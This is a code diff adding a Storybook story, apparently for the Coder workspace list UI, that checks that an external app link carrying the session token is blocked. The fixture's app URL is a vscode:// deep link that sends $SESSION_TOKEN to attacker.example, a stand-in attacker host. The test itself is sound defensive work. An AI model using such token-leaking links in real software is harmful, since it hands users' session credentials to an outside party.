@@ -7,6 +7,7 @@ import {
 	MockUserOwner,
 	MockWorkspace,
 	MockWorkspaceAgent,
+	MockWorkspaceApp,
 	mockApiError,
 } from "testHelpers/entities";
 import {
@@ -335,6 +336,43 @@ export const MultipleApps: Story = {
 											...MockWorkspaceAgent.apps[0],
 											display_name: "App 2",
 											id: "app-2",
+										},
+									],
+								},
+							],
+						},
+					],
+				},
+			},
+		],
+		count: allWorkspaces.length,
+	},
+};
+
+export const SessionTokenLinkBlocked: Story = {
+	args: {
+		workspaces: [
+			{
+				...MockWorkspace,
+				name: "session-token-link-blocked",
+				latest_build: {
+					...MockWorkspace.latest_build,
+					resources: [
+						{
+							...MockWorkspace.latest_build.resources[0],
+							agents: [
+								{
+									...MockWorkspaceAgent,
+									display_apps: [],
+									apps: [
+										{
+											...MockWorkspaceApp,
+											id: "blocked-app",
+											slug: "blocked-app",
+											display_name: "Blocked App",
+											health: "healthy",
+											external: true,
+											url: "vscode://coder.coder-remote/open?url=https://attacker.example&token=$SESSION_TOKEN",
 										},
 									],
 								},
